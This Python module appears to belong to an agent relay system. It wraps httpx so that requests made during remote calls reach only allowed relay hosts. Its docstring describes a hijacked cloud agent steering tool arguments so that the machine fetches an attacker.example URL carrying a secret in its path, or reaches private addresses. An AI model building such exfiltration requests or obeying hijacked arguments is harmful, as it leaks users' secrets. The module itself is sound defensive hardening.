"""Where a remote call may reach: this agent's home relay and the relays it visits, nothing else.

A tool reads other relays by address (`agent_card("x@host")`, `read_thread("agent:x@host")`, `verify(compare_with=...)`),
and a caller on the far side of a remote connector chooses those words. Left alone, a hijacked cloud agent could make
this machine fetch `https://attacker.example/agents/<secret>/card` (data in the path), or reach a loopback or private
address. So while a remote call runs (`autonomy.REMOTE_CALL` set) every outgoing HTTP request of this process is
checked against the allowed hosts, in one place: `httpx.Client.send` and `httpx.AsyncClient.send`, which every
`httpx.get`, `fetch.get` and client the tools use goes through. A request to any other host raises `httpx.ConnectError`,
so each tool handles it as an unreachable relay. `ALLOWED_HOSTS` is also read by `surface.check_call` as a first layer.
Outside a remote call nothing here applies.
"""

from __future__ import annotations

import re
from collections.abc import Callable
from urllib.parse import urlsplit

import httpx

from emporia import autonomy

_installed = False
#: Replaced by `server.build`: the allowed `host[:port]` set (lowercase). Empty means nothing is reachable.
ALLOWED_HOSTS: Callable[[], set[str]] = lambda: set()


def _canon(host: str) -> str:
    from emporia.addresses import canonical_host
    return canonical_host((host or "").strip().lower())


def host_allowed(host: str) -> bool:
    allowed = {_canon(h) for h in ALLOWED_HOSTS()}
    return _canon(host) in allowed


def url_host(url: str) -> str:
    try:
        return urlsplit(str(url)).netloc.rsplit("@", 1)[-1].lower()
    except ValueError:
        return ""


def _refuse(url: object) -> httpx.ConnectError:
    return httpx.ConnectError("a remote connector reaches only this agent's own relays "
                              f"(not {url_host(str(url)) or 'that address'})")


_HOSTLIKE = re.compile(r"(?:@|://|//)([^\s/@?#]+)")


def hosts_named_in(text: str) -> list[str]:
    """The hosts a piece of argument text names: after an `@`, or after `//`."""
    return [m.group(1).lower() for m in _HOSTLIKE.finditer(str(text))]


def install() -> None:
    """Wrap `httpx` once, in this process (the remote server's)."""
    global _installed
    if _installed:
        return
    _installed = True
    sync_send, async_send = httpx.Client.send, httpx.AsyncClient.send

    def send(self, request, *a, **k):
        if autonomy.REMOTE_CALL.get() and not host_allowed(request.url.netloc.decode().rsplit("@", 1)[-1]):
            raise _refuse(request.url)
        return sync_send(self, request, *a, **k)

    async def asend(self, request, *a, **k):
        if autonomy.REMOTE_CALL.get() and not host_allowed(request.url.netloc.decode().rsplit("@", 1)[-1]):
            raise _refuse(request.url)
        return await async_send(self, request, *a, **k)

    httpx.Client.send, httpx.AsyncClient.send = send, asend
